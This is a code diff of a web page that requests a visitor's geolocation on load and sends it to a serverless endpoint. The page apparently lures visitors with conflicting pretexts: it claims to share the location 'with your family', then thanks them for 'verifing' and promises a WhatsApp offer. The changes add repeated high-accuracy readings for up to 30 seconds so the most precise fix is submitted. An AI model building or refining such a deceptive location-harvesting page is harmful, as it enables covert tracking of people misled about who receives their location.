@@ -14,9 +14,15 @@
     body {
       margin: 0;
       min-height: 100vh;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont,
+        "Segoe UI", sans-serif;
       background:
-        radial-gradient(circle at top, #fff4cf 0%, #fff8ea 45%, #fff 100%);
+        radial-gradient(
+          circle at top,
+          #fff4cf 0%,
+          #fff8ea 45%,
+          #fff 100%
+        );
       color: #3b2114;
       display: grid;
       place-items: center;
@@ -26,11 +32,11 @@
     .card {
       width: 100%;
       max-width: 520px;
-      background: rgba(255,255,255,.96);
+      background: rgba(255, 255, 255, .96);
       border-radius: 26px;
       padding: 34px 25px;
       text-align: center;
-      box-shadow: 0 18px 60px rgba(100,50,10,.15);
+      box-shadow: 0 18px 60px rgba(100, 50, 10, .15);
       border: 1px solid #f1d39e;
     }
 
@@ -76,6 +82,7 @@
       margin-top: 22px;
       font-size: 15px;
       font-weight: 700;
+      line-height: 1.5;
     }
 
     .success {
@@ -94,6 +101,13 @@
       font-size: 12px;
       line-height: 1.5;
       color: #735f52;
+    }
+
+    .accuracy {
+      margin-top: 10px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #705546;
     }
   </style>
 </head>
@@ -121,12 +135,15 @@
     </div>
 
     <div id="status">
-      Please allow location sharing if you wish to share your current location with your family.
+      Please allow location sharing if you wish to share
+      your current location with your family.
     </div>
 
+    <div id="accuracy" class="accuracy"></div>
+
     <div class="permission">
-      Your browser will ask for permission before any location is shared.
-      Your location is not displayed on this page.
+      Your browser will ask for permission before any location
+      is shared. Your location is not displayed on this page.
     </div>
 
   </main>
@@ -136,111 +153,278 @@
 async function requestLocation() {
 
   const status = document.getElementById("status");
+  const accuracyDisplay = document.getElementById("accuracy");
 
   if (!navigator.geolocation) {
+
     status.textContent =
       "Location sharing is not supported by this browser.";
+
     status.className = "error";
+
     return;
   }
 
   status.textContent =
-    "Continue Next…";
+    "Getting your most accurate available location…";
 
-  navigator.geolocation.getCurrentPosition(
+  status.className = "";
 
-    async function(position) {
+  let bestPosition = null;
+  let watchId = null;
+  let finished = false;
 
-      const locationData = {
-        lat: position.coords.latitude,
-        lon: position.coords.longitude,
-        accuracy: position.coords.accuracy
-      };
+  /*
+    Keep track of the most accurate reading received.
+  */
+  function handlePosition(position) {
 
-      try {
+    const currentAccuracy =
+      position.coords.accuracy;
 
-        const response = await fetch(
-          "/.netlify/functions/location",
-          {
-            method: "POST",
-
-            headers: {
-              "Content-Type": "application/json"
-            },
-
-            body: JSON.stringify(locationData)
-          }
-        );
-
-        if (!response.ok) {
-          throw new Error("Location submission failed");
-        }
-
-        status.textContent =
-          "✓ Thank you for verifing, we will send offer soon.";
-
-        status.className = "success";
-
-      } catch (error) {
-
-        status.textContent =
-          "Unable to share the location. Please try again.";
-
-        status.className = "error";
+    console.log(
+      "Location reading:",
+      {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: currentAccuracy
       }
+    );
 
-    },
+    /*
+      Keep the reading with the smallest
+      accuracy value.
+    */
+    if (
+      !bestPosition ||
+      currentAccuracy < bestPosition.coords.accuracy
+    ) {
 
-    function(error) {
+      bestPosition = position;
 
-      if (error.code === 1) {
+      const roundedAccuracy =
+        Math.round(currentAccuracy);
 
-        status.textContent =
-          "Location permission was not granted.";
+      status.textContent =
+        "Improving location accuracy…";
 
-      } else if (error.code === 2) {
+      accuracyDisplay.textContent =
+        `Current best accuracy: ±${roundedAccuracy} metres`;
+    }
+  }
 
-        status.textContent =
-          "Your location could not be determined.";
+  /*
+    Handle location errors.
+  */
+  function handleError(error) {
 
-      } else if (error.code === 3) {
+    console.error(
+      "Location error:",
+      error
+    );
 
-        status.textContent =
-          "Location request timed out.";
+    /*
+      If we already have a valid reading,
+      keep that reading rather than throwing
+      away useful location information.
+    */
+    if (bestPosition) {
+      finish(bestPosition);
+      return;
+    }
 
-      } else {
+    if (error.code === 1) {
 
-        status.textContent =
-          "Unable to obtain your location.";
-      }
+      status.textContent =
+        "Location permission was not granted.";
+
+    } else if (error.code === 2) {
+
+      status.textContent =
+        "Your location could not be determined.";
+
+    } else if (error.code === 3) {
+
+      status.textContent =
+        "Location request timed out.";
+
+    } else {
+
+      status.textContent =
+        "Unable to obtain your location.";
+    }
+
+    status.className = "error";
+  }
+
+  /*
+    Stop watching and submit the best
+    location obtained.
+  */
+  async function finish(position) {
+
+    if (finished) {
+      return;
+    }
+
+    finished = true;
+
+    if (watchId !== null) {
+
+      navigator.geolocation.clearWatch(
+        watchId
+      );
+
+      watchId = null;
+    }
+
+    /*
+      No usable position was received.
+    */
+    if (!position) {
+
+      status.textContent =
+        "Unable to determine your location.";
 
       status.className = "error";
 
-    },
-
-    {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
+      return;
     }
 
+    const locationData = {
+
+      lat: position.coords.latitude,
+
+      lon: position.coords.longitude,
+
+      accuracy: position.coords.accuracy
+    };
+
+    console.log(
+      "Final location being submitted:",
+      locationData
+    );
+
+    const finalAccuracy =
+      Math.round(locationData.accuracy);
+
+    accuracyDisplay.textContent =
+      `Best available accuracy: ±${finalAccuracy} metres`;
+
+    status.textContent =
+      "Sharing your location…";
+
+    try {
+
+      const response = await fetch(
+        "/.netlify/functions/location",
+        {
+          method: "POST",
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
+          body: JSON.stringify(
+            locationData
+          )
+        }
+      );
+
+      if (!response.ok) {
+
+        throw new Error(
+          "Location submission failed"
+        );
+      }
+
+      status.textContent =
+        "✓ Thank you for verifing, we will send WhatsApp offer soon..";
+
+      status.className = "success";
+
+      accuracyDisplay.textContent =
+        `Location accuracy: approximately ±${finalAccuracy} metres`;
+
+    } catch (error) {
+
+      console.error(
+        "Location submission error:",
+        error
+      );
+
+      status.textContent =
+        "Unable to share the location. Please try again.";
+
+      status.className = "error";
+    }
+  }
+
+  /*
+    Request fresh, high-accuracy location readings.
+
+    enableHighAccuracy:
+      Ask the device for the best available
+      positioning source.
+
+    maximumAge: 0:
+      Don't use an old cached position.
+
+    timeout: 30 seconds:
+      Give the device enough time to obtain
+      a better GPS fix.
+  */
+  watchId = navigator.geolocation.watchPosition(
+    handlePosition,
+    handleError,
+    {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumAge: 0
+    }
   );
+
+  /*
+    Allow up to 30 seconds for the device to
+    improve the position.
+
+    IMPORTANT:
+    We do NOT reject locations above 50 or 100 m.
+
+    Whatever the best available reading is after
+    the period will be submitted.
+  */
+  setTimeout(function() {
+
+    if (!finished) {
+
+      finish(bestPosition);
+
+    }
+
+  }, 30000);
 }
 
 
 /*
   Request location after the page has loaded.
-  The browser/device decides whether and how
-  to display the permission prompt.
+  The browser/device controls the permission
+  prompt and the user must grant permission.
 */
 
-window.addEventListener("load", function() {
+window.addEventListener(
+  "load",
+  function() {
 
-  setTimeout(function() {
-    requestLocation();
-  }, 500);
+    setTimeout(
+      function() {
+        requestLocation();
+      },
+      500
+    );
 
-});
+  }
+);
 
 </script>
 
